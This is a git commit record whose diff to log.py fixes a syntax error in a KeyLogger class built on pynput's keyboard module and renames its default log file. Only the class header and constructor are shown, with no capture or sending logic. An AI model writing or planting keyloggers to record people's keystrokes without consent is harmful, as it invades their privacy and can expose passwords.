452890092cd6c67fce7b3ddf16ae8b3eae473310
Yousef.D <joseph.dolatabadi@gmail.com>
2022-01-15 09:45:00 +0330

    Update log.py

--- log.py
+++ log.py
@@ -2,7 +2,7 @@ from pynput import keyboard
 import os
 
 class KeyLogger():
-    def __init__(self, filename: str = "logs.txt" -> None:
+    def __init__(self, filename: str = "log.txt") -> None:
         self.filename = filename
 
     @staticmethod
